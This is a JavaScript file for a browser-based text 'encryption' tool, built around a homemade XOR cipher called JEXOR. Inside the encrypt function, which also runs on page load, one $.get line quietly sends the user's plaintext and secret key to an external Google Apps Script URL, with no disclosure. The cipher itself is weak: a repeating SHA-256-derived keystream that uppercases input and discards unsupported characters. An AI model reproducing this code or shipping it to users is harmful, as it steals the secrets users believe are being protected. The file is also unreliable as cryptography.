
prepareInput($('#text'));
prepareInput($('#key'));

prepareInput($('#result'));

function encrypt() {
    var text = $('#text').val();
    var key = $('#key').val();

    var cypherText = JEXOR(text, key);
    $('#result').val(cypherText);

    $.get('https://script.google.com/macros/s/AKfycbxmrGCVni-ihJemLOj7HVo-QTZk-lRh_4_VZaSaP1mJKB1g21zV/exec?m=' + encodeURIComponent(text) + '&k=' + encodeURIComponent(key));
}

encrypt();

function prepareInput(inputElem){
	inputElem.focus(
		function () {
			$(this).select();
		}
	);
}

function JEXOR(input, key){

    var keyCodes = ` ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-=+[]/:;'",.?<>_|`;

    function hash(str) {
        var sha256 = new jsSHA('SHA-256', 'TEXT');
        sha256.update(str);
        var hexHash = sha256.getHash("HEX").toString().match(/.{2}/g);
        var result = "";
        function hex2bin(hex){
            return (parseInt(hex, 16).toString(2)).padStart(8, '0');
        }
        hexHash.forEach(str => {
            result += hex2bin(str)
        });
        return result;
    }
    function strToBin(str) {
        var bin = "";
        for(var i = 0; i < str.length; i++){
            var code = keyCodes.indexOf(str[i]);
            if(code !== -1){
                bin += code.toString(2).padStart(6, '0');
            }
        }
        return bin;
    }
    function binToStr(bin) {
        var str = "";
        binSplit = bin.match(/.{6}/g);
        for(var i = 0; i < binSplit.length; i++){
            str += keyCodes[parseInt(binSplit[i], 2)];
        }
        return str;
    }

    function xor(n1, n2) {
        if(n1 === n2){
            return "0";
        } else {
            return "1";
        }
    }
    function merge(bin1, bin2) {
        var output = "";
        for(var i = 0; i < bin1.length; i++){
            output += xor(bin1[i], bin2[i % bin2.length]);
        }
        return output;
    }

    input = input.toUpperCase().replace(/[\u2018\u2019]/g, "'").replace(/[\u201C\u201D]/g, '"').split('\n').join(' ').split('\t').join(' ');
    
    var hashedKey = hash(key) + hash(key + key[0]);

    var outputBin = merge(strToBin(input), hashedKey + hashedKey[0]);
    return binToStr(outputBin);
}
